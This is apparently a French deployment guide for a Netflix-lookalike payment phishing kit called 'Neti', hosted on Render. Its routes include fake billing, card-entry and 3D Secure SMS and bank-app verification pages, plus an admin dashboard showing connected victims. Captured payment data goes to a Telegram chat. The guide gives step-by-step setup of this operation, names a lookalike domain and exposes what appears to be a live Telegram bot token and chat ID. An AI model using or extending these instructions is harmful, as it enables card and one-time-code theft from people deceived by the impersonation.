# 🚀 Guide de Déploiement Complet - Neti App

Ce guide explique comment déployer votre projet Neti sur **Render** (client + serveur WebSocket).

## 📋 Architecture de Déploiement

```
┌─────────────────────────────────────────────────────────┐
│                    RENDER                               │
│  ┌──────────────────┐    ┌──────────────────┐         │
│  │  Client React    │    │  Server WebSocket│         │
│  │  (Static Site)   │    │  (Node.js)       │         │
│  │  Port: Variable │    │  Port: 8080      │         │
│  └──────────────────┘    └──────────────────┘         │
│                          │                             │
│                          │ WebSocket (WSS)             │
│                          │                             │
└──────────────────────────┼─────────────────────────────┘
                           │
                           │ Communication temps réel
                           │
                    ┌──────▼──────┐
                    │   Telegram  │
                    │   Bot API   │
                    └─────────────┘
```

---

## 📦 PARTIE 1 : Déploiement sur Render

### 1.1 Préparer le projet pour Render

#### A. Vérifier les fichiers de configuration

**1. Fichier `render.yaml` à la racine du projet**

Le fichier `render.yaml` est déjà présent à la racine. Vérifiez qu'il contient :

```yaml
services:
  # Service WebSocket Backend
  - type: web
    name: neti-websocket-server
    env: node
    region: oregon
    plan: free
    rootDir: server
    buildCommand: npm install
    startCommand: npm start
    envVars:
      - key: NODE_ENV
        value: production
      - key: WS_PORT
        value: 8080
      - key: TELEGRAM_BOT_TOKEN
        sync: false
      - key: TELEGRAM_CHAT_ID
        sync: false

  # Service Frontend Static Site
  - type: static
    name: neti-client
    region: oregon
    plan: free
    rootDir: client
    buildCommand: npm install && npm run build
    staticPublishPath: ./dist
    envVars:
      - key: VITE_WS_URL
        value: wss://neti-websocket-server.onrender.com
```

**2. Vérifier `server/package.json`**

Votre `server/package.json` doit contenir :

```json
{
  "name": "neti-websocket-server",
  "version": "1.0.0",
  "main": "src/index.js",
  "type": "commonjs",
  "scripts": {
    "start": "node src/index.js"
  },
  "engines": {
    "node": ">=18.0.0"
  }
}
```

**3. Vérifier `client/package.json`**

Votre `client/package.json` doit contenir :

```json
{
  "name": "neti-client",
  "scripts": {
    "build": "vite build"
  }
}
```

---

### 1.2 Créer les services sur Render

#### Étape 1 : Créer le service WebSocket Server

1. Connectez-vous à [Render.com](https://render.com)
2. Cliquez sur **"New +"** → **"Blueprint"** (ou **"Web Service"**)
3. Connectez votre dépôt GitHub
4. Si vous utilisez Blueprint, Render détectera automatiquement `render.yaml`
5. Si vous créez manuellement, configurez :

   **Settings :**
   - **Name** : `neti-websocket-server`
   - **Environment** : `Node`
   - **Region** : `Oregon` (ou votre région préférée)
   - **Branch** : `main` (ou votre branche principale)
   - **Root Directory** : `server`
   - **Build Command** : `npm install`
   - **Start Command** : `npm start`
   - **Plan** : `Free` (ou `Starter` pour plus de ressources)

   **Environment Variables :**
   ```
   NODE_ENV=production
   WS_PORT=8080
   TELEGRAM_BOT_TOKEN=5921410949:AAEoUIUbUJyM4FaAmb9O5IQS2jpBgVgJUio
   TELEGRAM_CHAT_ID=-5126129839
   ```

6. Cliquez sur **"Create Web Service"**
7. Attendez que le build se termine (5-10 minutes)
8. **IMPORTANT** : Notez l'URL du service (ex: `neti-websocket-server.onrender.com`)

#### Étape 2 : Créer le service Client React (Static Site)

1. Cliquez sur **"New +"** → **"Static Site"**
2. Connectez le même dépôt GitHub
3. Configurez le service :

   **Settings :**
   - **Name** : `neti-client`
   - **Region** : Même région que le serveur WebSocket
   - **Branch** : `main`
   - **Root Directory** : `client`
   - **Build Command** : `npm install && npm run build`
   - **Publish Directory** : `dist`

   **Environment Variables :**
   ```
   VITE_WS_URL=wss://neti-websocket-server.onrender.com
   ```
   
   ⚠️ **IMPORTANT** : 
   - Remplacez `neti-websocket-server.onrender.com` par l'URL réelle de votre service WebSocket
   - Utilisez `wss://` (WebSocket Secure) et non `ws://` pour HTTPS
   - Ne mettez pas de port dans l'URL (Render gère automatiquement le port 443 pour WSS)

4. Cliquez sur **"Create Static Site"**
5. Attendez que le build se termine

#### Étape 3 : Configurer les URLs WebSocket

Dans Render, les services utilisent HTTPS/WSS par défaut. Vérifiez que `VITE_WS_URL` est correctement configuré :

1. Allez dans les **Settings** du service `neti-client`
2. Dans **Environment Variables**, vérifiez `VITE_WS_URL` :
   ```
   VITE_WS_URL=wss://neti-websocket-server.onrender.com
   ```
   (Sans le port, Render gère automatiquement le port 443 pour WSS)

3. Si vous avez modifié la variable, redéployez le service client

---

### 1.3 Vérifier le déploiement Render

1. **Vérifier le serveur WebSocket** :
   - Ouvrez l'URL de votre service backend (ex: `https://neti-websocket-server.onrender.com`)
   - Vérifiez les logs dans Render Dashboard
   - Le serveur devrait être en écoute sur le port 8080

2. **Vérifier le client React** :
   - Ouvrez l'URL de votre service frontend (ex: `https://netflixapp.webusrer.info`)
   - L'application devrait se charger
   - Ouvrez la console du navigateur (F12)
   - Vérifiez qu'il n'y a pas d'erreurs de connexion WebSocket
   - Testez la connexion en naviguant dans l'application

3. **Tester le Dashboard Admin** :
   - Accédez à `https://netflixapp.webusrer.info/admin`
   - Le Dashboard devrait se charger et afficher la liste des clients connectés

4. **Tester les notifications Telegram** :
   - Remplissez un formulaire de paiement
   - Vérifiez que les notifications arrivent dans votre chat Telegram

---

## 🔧 Configuration des Variables d'Environnement

### Variables du Serveur WebSocket

| Variable | Description | Exemple | Requis |
|----------|-------------|---------|--------|
| `NODE_ENV` | Environnement Node.js | `production` | Oui |
| `WS_PORT` | Port du serveur WebSocket | `8080` | Non (défaut: 8080) |
| `TELEGRAM_BOT_TOKEN` | Token du bot Telegram | `123456789:ABC...` | Oui |
| `TELEGRAM_CHAT_ID` | ID du chat Telegram | `-1001234567890` | Oui |

### Variables du Client React

| Variable | Description | Exemple | Requis |
|----------|-------------|---------|--------|
| `VITE_WS_URL` | URL du serveur WebSocket | `wss://neti-websocket-server.onrender.com` | Oui |

---

## 🔄 Mises à jour et Redéploiement

### Mettre à jour le code

```bash
# Faire vos modifications
git add .
git commit -m "Description des changements"
git push origin main
```

Render détectera automatiquement les changements et redéploiera les services.

### Mettre à jour les variables d'environnement

1. Allez dans le Dashboard Render
2. Sélectionnez le service concerné
3. Allez dans **Environment**
4. Modifiez les variables nécessaires
5. Cliquez sur **Save Changes**
6. Le service redémarre automatiquement

### Redéployer manuellement

1. Allez dans le Dashboard Render
2. Sélectionnez le service
3. Cliquez sur **Manual Deploy** → **Deploy latest commit**

---

## 🔍 Dépannage

### Le frontend ne se connecte pas au WebSocket

**Symptômes :**
- Erreur dans la console : `WebSocket connection failed`
- Le Dashboard n'affiche pas les clients

**Solutions :**
1. Vérifiez que `VITE_WS_URL` utilise `wss://` (pas `ws://`) pour HTTPS
2. Vérifiez que l'URL du backend est correcte (sans port)
3. Vérifiez les logs du backend pour les erreurs de connexion
4. Vérifiez que le service backend est actif (pas en sommeil)

### Le backend ne démarre pas

**Symptômes :**
- Build échoue
- Service ne démarre pas

**Solutions :**
1. Vérifiez les logs dans Render Dashboard
2. Vérifiez que toutes les variables d'environnement sont définies
3. Vérifiez que `TELEGRAM_BOT_TOKEN` et `TELEGRAM_CHAT_ID` sont valides
4. Vérifiez que le fichier `server/src/index.js` existe et est correct

### Build du client échoue

**Symptômes :**
- Build échoue avec des erreurs

**Solutions :**
1. Vérifiez que `package.json` contient tous les scripts nécessaires
2. Vérifiez que toutes les dépendances sont listées dans `package.json`
3. Vérifiez les logs de build dans Render
4. Testez le build localement : `cd client && npm install && npm run build`

### Les notifications Telegram ne fonctionnent pas

**Symptômes :**
- Les notifications ne sont pas reçues dans Telegram

**Solutions :**
1. Vérifiez que `TELEGRAM_BOT_TOKEN` est correct
2. Vérifiez que `TELEGRAM_CHAT_ID` est correct
3. Vérifiez les logs du serveur pour les erreurs d'API Telegram
4. Testez le bot Telegram manuellement avec l'API

### Service en sommeil (Free Plan)

**Symptômes :**
- Le service ne répond pas après une période d'inactivité
- Premier accès très lent (30-60 secondes)

**Solutions :**
1. C'est normal pour le plan gratuit (services s'endorment après 15 min d'inactivité)
2. Le premier accès après l'inactivité peut prendre 30-60 secondes
3. Pour éviter cela, utilisez un plan payant ou un service de "ping" externe
4. Vous pouvez configurer un cron job pour pinger votre service régulièrement

---

## 📝 Notes importantes

### WebSocket sur Render (Free Plan)

- Les services gratuits sur Render s'endorment après 15 minutes d'inactivité
- Le premier accès après l'inactivité peut prendre 30-60 secondes pour démarrer
- Pour éviter cela, utilisez un plan payant ou un service de "ping" externe

### HTTPS/WSS

- Render fournit automatiquement HTTPS pour tous les services
- Utilisez `wss://` (WebSocket Secure) au lieu de `ws://` pour les connexions WebSocket
- Les certificats SSL sont gérés automatiquement par Render

### Variables d'environnement sensibles

- ⚠️ **Ne jamais** commiter le fichier `.env` dans Git
- Utilisez les variables d'environnement de Render pour les secrets
- Le fichier `.env` est déjà dans `.gitignore`

### Structure des routes

L'application utilise les routes suivantes :
- `/` → Redirige vers `/billing` avec paramètres aléatoires
- `/billing` → Page de gestion des méthodes de paiement
- `/payment-details` → Formulaire de saisie des détails de paiement
- `/3ds-verification` → Vérification 3D Secure (SMS)
- `/3ds-verification-bank` → Vérification 3D Secure (Application bancaire)
- `/payment-confirmation` → Confirmation du paiement
- `/admin` → Dashboard d'administration

---

## 🔗 URLs après déploiement

Après le déploiement, vous aurez :

- **Frontend** : `https://netflixapp.webusrer.info`
- **Backend WebSocket** : `wss://neti-websocket-server.onrender.com`
- **Dashboard Admin** : `https://netflixapp.webusrer.info/admin`

---

## 📚 Ressources

- [Documentation Render](https://render.com/docs)
- [Guide WebSocket sur Render](https://render.com/docs/websockets)
- [Configuration des variables d'environnement](https://render.com/docs/environment-variables)
- [Guide de déploiement GitHub](DEPLOIEMENT_GITHUB.md)

---

**Besoin d'aide ?** Consultez les logs dans Render Dashboard ou ouvrez une issue sur GitHub.

